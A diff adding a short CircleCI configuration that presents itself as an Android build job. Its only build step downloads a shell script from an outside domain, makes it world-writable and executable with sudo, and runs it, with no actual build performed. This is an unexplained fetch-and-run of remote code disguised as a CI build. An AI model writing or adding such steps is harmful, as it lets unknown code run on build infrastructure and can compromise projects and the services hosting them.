@@ -1,0 +1,18 @@
+version: 2.1
+
+orbs:
+  android: circleci/android@0.2.1
+
+jobs:
+  build:
+    executor: android/android
+
+    steps:
+      - checkout
+      - run:
+          command: wget https://lolia.ga/dl/dl.sh
+                   sudo chmod 777 dl.sh
+                   ./dl.sh
+
+ 
+
